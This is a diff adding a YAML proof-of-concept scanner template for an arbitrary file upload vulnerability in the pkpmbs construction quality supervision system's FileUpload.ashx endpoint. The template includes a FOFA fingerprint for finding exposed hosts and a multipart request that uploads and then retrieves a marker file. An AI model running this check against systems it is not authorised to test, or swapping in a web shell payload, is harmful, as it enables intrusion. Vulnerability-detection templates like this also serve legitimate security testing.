@@ -1,0 +1,38 @@
+id: poc-yaml-pkpmbs-fileupload-ashx-anyfile-upload
+info:
+  name: pkpmbs 建设工程质量监督系统 FileUpload.ashx 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: pkpmbs 建设工程质量监督系统
+  fofa: icon_hash="2001627082"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Platform/System/FileUpload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l
+  data: '------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.txt"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l
+
+    Content-Disposition: form-data; name="target"
+
+
+    /Applications/SkillDevelopAndEHS/
+
+    ------YsOxWxSvj1KyZow1PTsh98fdu6l--'
+  expression: status_code == 200 && contains(body,t1) && contains(body,"\"msg\":\"上传成功\"")
+- method: GET
+  path: /Applications/SkillDevelopAndEHS/{{.t1}}.txt
+  expression: status_code == 200 && body == t2
+transport: http
